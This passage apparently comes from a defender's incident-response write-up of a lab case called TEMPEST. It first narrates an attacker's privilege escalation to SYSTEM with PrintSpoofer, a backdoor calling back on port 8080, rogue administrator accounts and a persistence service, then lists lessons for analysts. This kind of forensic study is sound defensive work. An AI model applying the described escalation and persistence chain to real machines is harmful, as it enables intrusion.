Privilege Escalation (SYSTEM): Once inside the administrative session, the attacker transferred the spf.exe utility (PrintSpoofer). They exploited SeImpersonatePrivilege to duplicate the local system security token and execute a new elevated payload, final.exe, with full NT AUTHORITY\SYSTEM privileges. This new backdoor established persistent SYSTEM-level connections with the attacker's server on port 8080.


Actions on Objectives: With full control and SYSTEM privileges on the machine, the attacker created two local user accounts (shion and shuna). Although the first attempt failed due to the missing /add parameter in the Windows command utility, the accounts were eventually created successfully (logging Event ID 4720), and shion was added to the local Administrators group (logging Event ID 4732). Finally, the persistent service TempestUpdate2 was registered to ensure that the final.exe backdoor launched automatically upon every system boot.


Based on the practical investigation of the TEMPEST case, the main takeaways and consolidated key learnings were:

The Analyst's Investigative Role: It became evident that a security analyst's role extends far beyond merely interpreting automated alerts generated by defense systems. Adopting 

a structured investigative approach is indispensable to chronologically reconstruct the attack chain (Cyber Kill Chain), identify the root cause of the compromise, and execute rapid containment actions to mitigate impact on the organization.


Systemic Event Correlation: The efficient detection and identification of complex threats depend directly on the ability to correlate logs from various sources (network traffic, SIEM, endpoints, and firewalls), moving beyond isolated data analysis.


Context and False Positive Reduction: Understanding standard behavior and expected traffic flows within the corporate network is essential for swiftly and accurately distinguishing genuinely malicious activity from legitimate system anomalies.


Critical Importance of Response Time: The time window between identifying a threat and isolating the attack vector is the most critical factor in preventing an attacker from pivoting laterally or exfiltrating confidential data.


Rigor in Forensic Documentation: Creating detailed, structured reports during the incident response process is vital to ensuring that both technical teams (SOC/Incident Response) and management understand with precision the entry vector used, the extent of damage on impacted systems, and the necessary mitigation recommendations.


In summary, the project demonstrates that a successful incident response requires the analyst to combine technical precision in deep artifact analysis (such as event logs and network captures) with agility and clarity in documentation to safeguard the corporate environment.






































